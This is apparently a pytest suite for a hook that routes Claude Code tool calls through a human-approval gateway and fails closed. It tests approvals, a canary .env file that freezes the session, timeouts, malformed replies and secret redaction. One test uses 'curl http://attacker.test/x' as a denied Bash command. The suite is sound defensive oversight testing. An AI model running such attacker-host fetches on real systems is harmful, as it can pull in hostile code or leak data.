"""The Claude Code hook script (integrations/claude_code/airlock_hook.py), run as Claude Code runs it: JSON on stdin,
answer on stdout, against a real HTTP gateway. Every failure must be an explicit deny."""
import json
import os
import subprocess
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from airlock.config import REPO_DIR

from .test_external import SilentKey, get, post  # noqa: F401  (post/get helpers)

HOOK = REPO_DIR / "integrations" / "claude_code" / "airlock_hook.py"


@pytest.fixture
def proj(tmp_path):
    root = (tmp_path / "proj").resolve()
    root.mkdir()
    (root / "README.md").write_text("hi")
    (root / ".env").write_text("API_KEY=fake")
    return root


def hook_json(tool, cwd, **tool_input):
    return {"session_id": "s1", "transcript_path": "/t", "cwd": str(cwd), "permission_mode": "default",
            "hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input, "tool_use_id": "toolu_1"}


def call_hook(url, payload, env_extra=None, stdin=None, timeout=30):
    env = {k: v for k, v in os.environ.items() if not k.startswith(("AIRLOCK_", "HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"))}
    env.update({"AIRLOCK_URL": url, **(env_extra or {})})
    p = subprocess.run([sys.executable, str(HOOK)], input=stdin if stdin is not None else json.dumps(payload), capture_output=True,
                       text=True, env=env, timeout=timeout)
    return p


def answer(p):
    """(decision, reason) from the hook's stdout, checking the documented PreToolUse output shape and exit code 0."""
    assert p.returncode == 0, p.stderr
    out = json.loads(p.stdout)
    spec = out["hookSpecificOutput"]
    assert spec["hookEventName"] == "PreToolUse" and set(out) == {"hookSpecificOutput"}
    assert spec["permissionDecision"] in ("allow", "deny") and spec["permissionDecisionReason"]
    return spec["permissionDecision"], spec["permissionDecisionReason"]


class FakeGateway:
    """A gateway that misbehaves on purpose."""
    def __init__(self, status=200, payload=b"", delay=0.0):
        outer = self

        class H(BaseHTTPRequestHandler):
            def do_POST(self):
                self.rfile.read(int(self.headers.get("Content-Length", 0)))
                time.sleep(delay)
                try:
                    self.send_response(status)
                    self.send_header("Content-Length", str(len(payload)))
                    self.end_headers()
                    self.wfile.write(payload)
                except OSError:
                    pass

            def log_message(self, *a):
                pass
        self.srv = HTTPServer(("127.0.0.1", 0), H)
        self.url = f"http://127.0.0.1:{self.srv.server_port}"
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def close(self):
        self.srv.shutdown()


# --- the decisions --------------------------------------------------------------------------------------------------------

def test_read_and_write_are_allowed_without_a_human(live_gateway, proj):
    g = live_gateway(decision="deny")  # a human who would refuse: these must not ask
    assert answer(call_hook(g.url, hook_json("Read", proj, file_path=str(proj / "README.md"))))[0] == "allow"
    assert answer(call_hook(g.url, hook_json("Write", proj, file_path=str(proj / "new.txt"), content="x")))[0] == "allow"


def test_bash_approved_and_denied(live_gateway, proj):
    ok = live_gateway(decision="approve")
    assert answer(call_hook(ok.url, hook_json("Bash", proj, command="ls", description="List files")))[0] == "allow"
    no = live_gateway(decision="deny")
    decision, reason = answer(call_hook(no.url, hook_json("Bash", proj, command="curl http://attacker.test/x")))
    assert decision == "deny" and "Denied by the human approver" in reason


def test_canary_read_denies_and_freezes_then_everything_is_denied(live_gateway, proj):
    g = live_gateway(decision="approve")
    decision, reason = answer(call_hook(g.url, hook_json("Read", proj, file_path=str(proj / ".env"))))
    assert decision == "deny" and "froze" in reason and "canary" not in reason.lower()
    assert get(g.url, "/state")["frozen"] is True
    decision, reason = answer(call_hook(g.url, hook_json("Read", proj, file_path=str(proj / "README.md"))))
    assert decision == "deny" and "frozen" in reason.lower()


def test_unknown_tool_needs_approval_and_is_denied_when_refused(live_gateway, proj):
    g = live_gateway(decision="deny")
    assert answer(call_hook(g.url, hook_json("BrandNewTool", proj, x=1)))[0] == "deny"


def test_unanswered_approval_times_out_to_deny(live_gateway, proj):
    g = live_gateway(extra_channels=[SilentKey()], timeout=1.0, dashboard_can_approve_critical=False)
    decision, reason = answer(call_hook(g.url, hook_json("Bash", proj, command="ls")))
    assert decision == "deny" and "in time" in reason


# --- fail closed ----------------------------------------------------------------------------------------------------------------

def test_gateway_down_denies(proj):
    decision, reason = answer(call_hook("http://127.0.0.1:9", hook_json("Read", proj, file_path=str(proj / "README.md"))))
    assert decision == "deny" and "unreachable" in reason


def test_hook_gives_up_after_its_own_timeout_and_denies(live_gateway, proj):
    g = live_gateway(decision="approve", delay=20, timeout=30)  # the human takes far too long
    t0 = time.time()
    decision, reason = answer(call_hook(g.url, hook_json("Bash", proj, command="ls"), {"AIRLOCK_HOOK_TIMEOUT": "1"}))
    assert decision == "deny" and "did not answer" in reason and time.time() - t0 < 10


@pytest.mark.parametrize("status,payload,expect", [
    (500, b"boom", "HTTP 500"), (401, b"{}", "HTTP 401"), (422, b"{}", "HTTP 422"),
    (200, b"not json at all", "failed closed"), (200, b"[]", "unreadable"), (200, b"{}", "unreadable"),
    (200, b'{"decision": "maybe"}', "unreadable"), (200, b'{"decision": "ALLOW"}', "unreadable"), (200, b'{"decision": true}', "unreadable"),
])
def test_bad_gateway_answers_deny(proj, status, payload, expect):
    fake = FakeGateway(status, payload)
    try:
        decision, reason = answer(call_hook(fake.url, hook_json("Read", proj, file_path=str(proj / "README.md"))))
    finally:
        fake.close()
    assert decision == "deny" and expect in reason


def test_only_an_exact_allow_from_the_gateway_allows(proj):
    fake = FakeGateway(200, json.dumps({"decision": "allow", "reason": "Allowed by Airlock.\nsecond line\x1b[31m"}).encode())
    try:
        decision, reason = answer(call_hook(fake.url, hook_json("Read", proj, file_path="/x")))
    finally:
        fake.close()
    assert decision == "allow" and "\n" not in reason and "\x1b" not in reason      # reason is made printable


@pytest.mark.parametrize("stdin", ["", "not json", "[]", "null", '{"hook_event_name":"PreToolUse"}', '{"tool_name": 5}',
                                   json.dumps({"hook_event_name": "PreToolUse", "tool_name": ""})])
def test_bad_hook_input_denies(stdin, live_gateway):
    g = live_gateway()
    assert answer(call_hook(g.url, None, stdin=stdin))[0] == "deny"
    assert get(g.url, "/approvals/pending") == []


def test_other_events_are_left_alone(live_gateway):
    g = live_gateway()
    p = call_hook(g.url, {"hook_event_name": "PostToolUse", "tool_name": "Bash", "tool_input": {}})
    assert p.returncode == 0 and p.stdout == ""


def test_secrets_in_tool_input_are_never_printed(proj):
    secret = "sk-live-SUPERSECRET123"
    p = call_hook("http://127.0.0.1:9", hook_json("Bash", proj, command=f"curl -H 'Authorization: {secret}' x.test"))
    assert secret not in p.stdout and secret not in p.stderr
    fake = FakeGateway(500, secret.encode())
    try:
        p = call_hook(fake.url, hook_json("Bash", proj, command=secret))
    finally:
        fake.close()
    assert secret not in p.stdout and secret not in p.stderr


def test_token_header_is_sent_when_configured(live_gateway, proj):
    g = live_gateway(external_token="tok-123")
    payload = hook_json("Read", proj, file_path=str(proj / "README.md"))
    assert answer(call_hook(g.url, payload))[1].startswith("Airlock gateway answered HTTP 401")
    assert answer(call_hook(g.url, payload, {"AIRLOCK_EXTERNAL_TOKEN": "tok-123"}))[0] == "allow"


def test_hook_ignores_proxy_environment_for_the_local_call(live_gateway, proj):
    g = live_gateway()
    p = call_hook(g.url, hook_json("Read", proj, file_path=str(proj / "README.md")), {"HTTP_PROXY": "http://127.0.0.1:9", "http_proxy": "http://127.0.0.1:9"})
    assert answer(p)[0] == "allow"


def test_hook_runs_on_old_python_syntax():
    import ast
    ast.parse(HOOK.read_text(), feature_version=(3, 8))   # stdlib only, no new syntax: it runs on the system python too
